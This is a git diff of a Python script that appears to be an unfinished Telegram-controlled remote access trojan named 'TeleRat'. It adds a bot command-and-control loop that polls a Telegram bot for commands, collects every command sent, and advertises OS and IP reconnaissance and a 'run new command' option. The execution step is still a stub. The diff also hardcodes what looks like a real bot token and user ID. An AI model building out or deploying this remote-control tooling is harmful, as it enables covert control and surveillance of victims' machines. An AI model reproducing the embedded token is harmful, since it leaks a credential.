@@ -9,6 +9,9 @@ import wmi
 import ngrok
 from colorama import Fore, Back, Style
 import ipapi
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+
 
 userIp  = ''
 userLocation = ''
@@ -19,7 +22,7 @@ class TeleManager():
         self.userId = userId
         self.userIp = ''
         self.userLocation = ''
-        self.allCommands = []
+        self.allCommands = ['2','34']
 
     def ip_enum(self):
         '''
@@ -116,7 +119,7 @@ class TeleManager():
         response = requests.post(url, data=payload)
         
         if response.status_code == 200:
-            print(Fore.LIGHTGREEN_EX + '[+] Message Sender Bypass Mode => Message Sent Successfully!')
+            print(Fore.LIGHTGREEN_EX + '[+] Message Sender Bypass Mode => Message Sent Successfully!'+Style.RESET_ALL)
             return True
         
     def send_message(self, msg):
@@ -201,11 +204,18 @@ class TeleManager():
                 #Function return and Outputs
                 self.lastCommand = lastCmd
                 print(Fore.LIGHTGREEN_EX+f'[+] Last Command Bypass Mode => from Bot: {self.lastCommand}'+Style.RESET_ALL)
+                
+                for cmd in resultAsDict['result']:
+                    self.allCommands.append(cmd['message']['text'])
+                
                 return lastCmd
         except requests.ConnectionError or requests.RequestException:
             print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => Internet Connection Error!!!'+Style.RESET_ALL)
-        except:
+        except IndexError:
+            print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => No Command Found!!!'+Style.RESET_ALL)
+        except Exception as e:
             print(Fore.LIGHTMAGENTA_EX + '[-] Last Command Bypass Mode => Unknown Error happened...'+Style.RESET_ALL)
+            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
                    
     def last_command_normal_mode(self):
         '''summary
@@ -219,10 +229,16 @@ class TeleManager():
                 lastCmd = response.json()['result'][-1]['message']['text']
                 print(Fore.LIGHTGREEN_EX+f'[+] Last Command => from Bot: {lastCmd}'+Style.RESET_ALL)
                 self.lastCommand = lastCmd
+
+                for cmd in response.json()['result']:
+                    self.allCommands.append(cmd['message']['text'])
+
                 return lastCmd
-        
         except requests.ConnectionError or requests.RequestException:
             print(Fore.LIGHTRED_EX + '[-] Last Command => Internet Connection Error!!!'+Style.RESET_ALL)
+        
+        except IndexError:
+            print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => No Command Found!!!'+Style.RESET_ALL)
         
         except Exception as e:
             print(Fore.LIGHTRED_EX + '[-] Last Command => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
@@ -237,6 +253,15 @@ class TeleManager():
         else: #client side in iran
             self.last_command_bypass_mode()
             
+    def all_commands(self):
+        num = 1
+        print(Fore.LIGHTGREEN_EX+f'[+] All Commands => \n'+Style.RESET_ALL)
+        for x in self.allCommands:
+            print(Fore.YELLOW+f'[+] Command-{num} =>'+Fore.LIGHTWHITE_EX+ x +Style.RESET_ALL)
+            num += 1
+            
+        return self.allCommands
+    
     def list_command(self):
         '''summary
         This function send List of Commands to user
@@ -294,6 +319,8 @@ class TeleManager():
         
         elif userInput == '99':
             self.exit_bot()
+        elif userInput == '00':
+            exit()
         else:
             print(Fore.LIGHTRED_EX + '[-] Usage Options => Invalid Command!!!'+Style.RESET_ALL)
             self.usage_options()
@@ -306,6 +333,59 @@ class TeleManager():
         self.send_message('Client Side python script Shuting down...! 📴 ')
         exit()
         
+
+class TeleRat(TeleManager):
+    def __init__(self, token, userId):
+        super().__init__(token, userId)
+        self.token = token
+        self.userId = userId
+        self.userIp = ''
+        self.userLocation = ''
+        self.allCommands = self.all_commands()
+    
+    def tester(self):
+        super().last_command()
+        self.list_command()
+        return self.allCommands
+    
+    def do_command(self):
+        '''summary
+        this function get last command from bot and then execute it
+        '''
+        lastCmd = self.last_command()
+        
+        
+class BotHandler():   
+    def __init__(self, token):
+        self.token = token
+        
+    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await update.message.replay_text('Hello Ninja 🥷👋👋👋')
+    
+    async def help(self, update, context):
+        await update.message.reply_text('''
+        /list => Show List of Commands \n
+        /send => Send New Message \n
+        /none => Run New Command \n
+        /os => Get OS Information \n
+        /ip => Get IP Information \n
+        /help => Get Help \n
+        /exit => Exit from Bot \n
+        ''')
+        
+    async def main(self):
+        #Build Application
+        application = Application.builder().token(self.token).build()
+        
+        #Add Command Handlers to Bot
+        application.add_handler(CommandHandler('start', self.start))
+        application.add_handler(CommandHandler('help', self.help))
+        
+        await application.initialize()
+        await application.start()
+        await application.updater.start_polling()
+        #await application.run_until_disconnected()
+    
 
         
 def bot_runner():
@@ -335,9 +415,10 @@ def bot_runner():
             telegram.last_command()
             continue
             
-        elif option[0] == 'allcmd':  #Check this Condition (all commands)
-            print(telegram.allCommands)
-            telegram.all_command_normal_mode()
+        elif option[1] == 4:  #Check this Condition (all commands)
+            telegram.all_commands()
+            
+            #telegram.all_command_normal_mode()
             continue
 
         elif option[0] == 'help':
@@ -345,12 +426,29 @@ def bot_runner():
             continue
         
         #telegram.send_message(telegram.os_enum())
-
-
+def rat_runner():
+    import asyncio
+    token = '7381866212:AAEh7VRd5sdOOz7tISehbaGsX0-y_lrc3os'
+    #botUsername = 'davoodya_bot'
+    #botUrl = f'https://api.telegram.org/bot{token}/GetUpdates'
+    dayaId = '673330561'
+    
+    #actions = TeleRat(token=token, userId=dayaId)
+    #actions.send_message('Hello World!')
+    #actions.tester()
+    
+    #teleHandler = BotHandler(token=token)
+    #asyncio.run(teleHandler.main())
+    
+    #telegram = TeleManager(token=token, userId=dayaId)
+    
+    
 
 def main():
-    bot_runner()
+    #bot_runner()
     #print(f'[+] IP: {userIp} in {userLocation} Country')
+    bot_runner()
 
 if __name__ == '__main__':
+    
     main()
